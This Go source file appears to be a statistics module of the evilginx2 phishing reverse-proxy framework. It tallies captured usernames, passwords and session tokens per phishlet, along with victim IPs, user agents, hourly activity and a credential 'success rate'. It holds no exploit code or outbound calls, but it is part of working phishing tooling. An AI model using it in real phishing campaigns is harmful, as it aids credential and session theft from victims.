package core

import (
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/kgretzky/evilginx2/database"
)

// Stats holds campaign statistics
type Stats struct {
	db *database.Database
}

// PhishletStats holds per-phishlet statistics
type PhishletStats struct {
	Name             string
	TotalSessions    int
	WithCredentials  int
	WithTokens       int
	UniqueIPs        int
	SuccessRate      float64
	FirstSeen        time.Time
	LastSeen         time.Time
	TopUserAgents    map[string]int
	HourlyActivity   [24]int
}

// NewStats creates a new Stats instance
func NewStats(db *database.Database) *Stats {
	return &Stats{db: db}
}

// GetOverview returns overall campaign statistics
func (s *Stats) GetOverview() (string, error) {
	sessions, err := s.db.ListSessions()
	if err != nil {
		return "", err
	}

	if len(sessions) == 0 {
		return "No sessions recorded yet.", nil
	}

	// Calculate stats
	totalSessions := len(sessions)
	withCredentials := 0
	withTokens := 0
	uniqueIPs := make(map[string]bool)
	phishletCounts := make(map[string]int)
	hourlyActivity := [24]int{}
	var firstSeen, lastSeen time.Time

	for _, sess := range sessions {
		// Count credentials
		if sess.Username != "" || sess.Password != "" {
			withCredentials++
		}

		// Count tokens
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			withTokens++
		}

		// Track unique IPs
		if sess.RemoteAddr != "" {
			uniqueIPs[sess.RemoteAddr] = true
		}

		// Count by phishlet
		phishletCounts[sess.Phishlet]++

		// Track time range
		sessTime := time.Unix(sess.CreateTime, 0)
		if firstSeen.IsZero() || sessTime.Before(firstSeen) {
			firstSeen = sessTime
		}
		if lastSeen.IsZero() || sessTime.After(lastSeen) {
			lastSeen = sessTime
		}

		// Hourly activity
		hourlyActivity[sessTime.Hour()]++
	}

	// Calculate success rate
	successRate := float64(0)
	if totalSessions > 0 {
		successRate = float64(withCredentials) / float64(totalSessions) * 100
	}

	// Find peak hour
	peakHour := 0
	peakCount := 0
	for h, count := range hourlyActivity {
		if count > peakCount {
			peakHour = h
			peakCount = count
		}
	}

	// Build output
	var out strings.Builder
	green := color.New(color.FgHiGreen)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgHiYellow)
	dim := color.New(color.FgGreen)

	out.WriteString("\n")
	out.WriteString(green.Sprint("╔══════════════════════════════════════════════════════════════╗\n"))
	out.WriteString(green.Sprint("║") + cyan.Sprint("                    CAMPAIGN STATISTICS                       ") + green.Sprint("║\n"))
	out.WriteString(green.Sprint("╚══════════════════════════════════════════════════════════════╝\n"))
	out.WriteString("\n")

	// Summary section
	out.WriteString(yellow.Sprint(" SUMMARY\n"))
	out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))
	out.WriteString(fmt.Sprintf("   Total Sessions:     %s\n", green.Sprintf("%d", totalSessions)))
	out.WriteString(fmt.Sprintf("   With Credentials:   %s\n", green.Sprintf("%d", withCredentials)))
	out.WriteString(fmt.Sprintf("   With Tokens:        %s\n", green.Sprintf("%d", withTokens)))
	out.WriteString(fmt.Sprintf("   Unique IPs:         %s\n", green.Sprintf("%d", len(uniqueIPs))))
	out.WriteString(fmt.Sprintf("   Success Rate:       %s\n", green.Sprintf("%.1f%%", successRate)))
	out.WriteString("\n")

	// Time range
	out.WriteString(yellow.Sprint(" TIME RANGE\n"))
	out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))
	out.WriteString(fmt.Sprintf("   First Session:      %s\n", cyan.Sprint(firstSeen.Format("2006-01-02 15:04:05"))))
	out.WriteString(fmt.Sprintf("   Last Session:       %s\n", cyan.Sprint(lastSeen.Format("2006-01-02 15:04:05"))))
	out.WriteString(fmt.Sprintf("   Peak Activity:      %s\n", cyan.Sprintf("%02d:00 - %02d:59 (%d sessions)", peakHour, peakHour, peakCount)))
	out.WriteString("\n")

	// Per-phishlet breakdown
	if len(phishletCounts) > 0 {
		out.WriteString(yellow.Sprint(" BY PHISHLET\n"))
		out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))

		// Sort phishlets by count
		type kv struct {
			Key   string
			Value int
		}
		var sorted []kv
		for k, v := range phishletCounts {
			sorted = append(sorted, kv{k, v})
		}
		sort.Slice(sorted, func(i, j int) bool {
			return sorted[i].Value > sorted[j].Value
		})

		for _, kv := range sorted {
			pct := float64(kv.Value) / float64(totalSessions) * 100
			bar := strings.Repeat("█", int(pct/5))
			out.WriteString(fmt.Sprintf("   %-18s %s %s\n",
				cyan.Sprint(kv.Key),
				green.Sprintf("%3d", kv.Value),
				dim.Sprint(bar)))
		}
		out.WriteString("\n")
	}

	// Hourly activity chart
	out.WriteString(yellow.Sprint(" HOURLY ACTIVITY\n"))
	out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))
	out.WriteString(s.renderHourlyChart(hourlyActivity, peakCount))
	out.WriteString("\n")

	return out.String(), nil
}

// GetPhishletStats returns statistics for a specific phishlet
func (s *Stats) GetPhishletStats(phishlet string) (string, error) {
	sessions, err := s.db.ListSessions()
	if err != nil {
		return "", err
	}

	// Filter sessions for this phishlet
	var filtered []*database.Session
	for _, sess := range sessions {
		if sess.Phishlet == phishlet {
			filtered = append(filtered, sess)
		}
	}

	if len(filtered) == 0 {
		return fmt.Sprintf("No sessions recorded for phishlet: %s", phishlet), nil
	}

	// Calculate stats
	stats := &PhishletStats{
		Name:          phishlet,
		TotalSessions: len(filtered),
		TopUserAgents: make(map[string]int),
	}

	uniqueIPs := make(map[string]bool)

	for _, sess := range filtered {
		if sess.Username != "" || sess.Password != "" {
			stats.WithCredentials++
		}
		if len(sess.CookieTokens) > 0 {
			stats.WithTokens++
		}
		if sess.RemoteAddr != "" {
			uniqueIPs[sess.RemoteAddr] = true
		}

		// Track user agents
		if sess.UserAgent != "" {
			ua := truncateUA(sess.UserAgent)
			stats.TopUserAgents[ua]++
		}

		// Track time
		sessTime := time.Unix(sess.CreateTime, 0)
		if stats.FirstSeen.IsZero() || sessTime.Before(stats.FirstSeen) {
			stats.FirstSeen = sessTime
		}
		if stats.LastSeen.IsZero() || sessTime.After(stats.LastSeen) {
			stats.LastSeen = sessTime
		}

		stats.HourlyActivity[sessTime.Hour()]++
	}

	stats.UniqueIPs = len(uniqueIPs)
	if stats.TotalSessions > 0 {
		stats.SuccessRate = float64(stats.WithCredentials) / float64(stats.TotalSessions) * 100
	}

	// Build output
	var out strings.Builder
	green := color.New(color.FgHiGreen)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgHiYellow)
	dim := color.New(color.FgGreen)

	out.WriteString("\n")
	out.WriteString(green.Sprint("╔══════════════════════════════════════════════════════════════╗\n"))
	out.WriteString(green.Sprint("║") + cyan.Sprintf("              PHISHLET: %-36s", strings.ToUpper(phishlet)) + green.Sprint("║\n"))
	out.WriteString(green.Sprint("╚══════════════════════════════════════════════════════════════╝\n"))
	out.WriteString("\n")

	out.WriteString(yellow.Sprint(" STATISTICS\n"))
	out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))
	out.WriteString(fmt.Sprintf("   Total Sessions:     %s\n", green.Sprintf("%d", stats.TotalSessions)))
	out.WriteString(fmt.Sprintf("   With Credentials:   %s\n", green.Sprintf("%d", stats.WithCredentials)))
	out.WriteString(fmt.Sprintf("   With Tokens:        %s\n", green.Sprintf("%d", stats.WithTokens)))
	out.WriteString(fmt.Sprintf("   Unique IPs:         %s\n", green.Sprintf("%d", stats.UniqueIPs)))
	out.WriteString(fmt.Sprintf("   Success Rate:       %s\n", green.Sprintf("%.1f%%", stats.SuccessRate)))
	out.WriteString(fmt.Sprintf("   First Seen:         %s\n", cyan.Sprint(stats.FirstSeen.Format("2006-01-02 15:04:05"))))
	out.WriteString(fmt.Sprintf("   Last Seen:          %s\n", cyan.Sprint(stats.LastSeen.Format("2006-01-02 15:04:05"))))
	out.WriteString("\n")

	// Top user agents
	if len(stats.TopUserAgents) > 0 {
		out.WriteString(yellow.Sprint(" TOP USER AGENTS\n"))
		out.WriteString(dim.Sprint(" ───────────────────────────────────────\n"))

		type kv struct {
			Key   string
			Value int
		}
		var sorted []kv
		for k, v := range stats.TopUserAgents {
			sorted = append(sorted, kv{k, v})
		}
		sort.Slice(sorted, func(i, j int) bool {
			return sorted[i].Value > sorted[j].Value
		})

		count := 0
		for _, kv := range sorted {
			if count >= 5 {
				break
			}
			out.WriteString(fmt.Sprintf("   %s %s\n", green.Sprintf("%3d", kv.Value), dim.Sprint(kv.Key)))
			count++
		}
		out.WriteString("\n")
	}

	return out.String(), nil
}

// renderHourlyChart renders an ASCII chart of hourly activity
func (s *Stats) renderHourlyChart(activity [24]int, max int) string {
	var out strings.Builder
	green := color.New(color.FgHiGreen)
	dim := color.New(color.FgGreen)

	if max == 0 {
		max = 1
	}

	// Render 5 rows
	for row := 4; row >= 0; row-- {
		threshold := float64(max) * float64(row+1) / 5.0
		out.WriteString("   ")
		for h := 0; h < 24; h++ {
			if float64(activity[h]) >= threshold {
				out.WriteString(green.Sprint("█"))
			} else {
				out.WriteString(dim.Sprint("░"))
			}
		}
		out.WriteString("\n")
	}

	// Hour labels
	out.WriteString(dim.Sprint("   0     6     12    18   23\n"))

	return out.String()
}

// truncateUA truncates user agent string for display
func truncateUA(ua string) string {
	if len(ua) > 50 {
		return ua[:47] + "..."
	}
	return ua
}

// GetTimeRangeStats returns stats filtered by time range
func (s *Stats) GetTimeRangeStats(from, to time.Time) (string, error) {
	sessions, err := s.db.ListSessions()
	if err != nil {
		return "", err
	}

	// Filter by time range
	var filtered []*database.Session
	for _, sess := range sessions {
		sessTime := time.Unix(sess.CreateTime, 0)
		if (from.IsZero() || sessTime.After(from) || sessTime.Equal(from)) &&
			(to.IsZero() || sessTime.Before(to) || sessTime.Equal(to)) {
			filtered = append(filtered, sess)
		}
	}

	green := color.New(color.FgHiGreen)
	cyan := color.New(color.FgHiCyan)

	if len(filtered) == 0 {
		return fmt.Sprintf("No sessions in range: %s to %s",
			cyan.Sprint(from.Format("2006-01-02")),
			cyan.Sprint(to.Format("2006-01-02"))), nil
	}

	withCreds := 0
	for _, sess := range filtered {
		if sess.Username != "" || sess.Password != "" {
			withCreds++
		}
	}

	return fmt.Sprintf("Sessions in range: %s | With credentials: %s",
		green.Sprintf("%d", len(filtered)),
		green.Sprintf("%d", withCreds)), nil
}
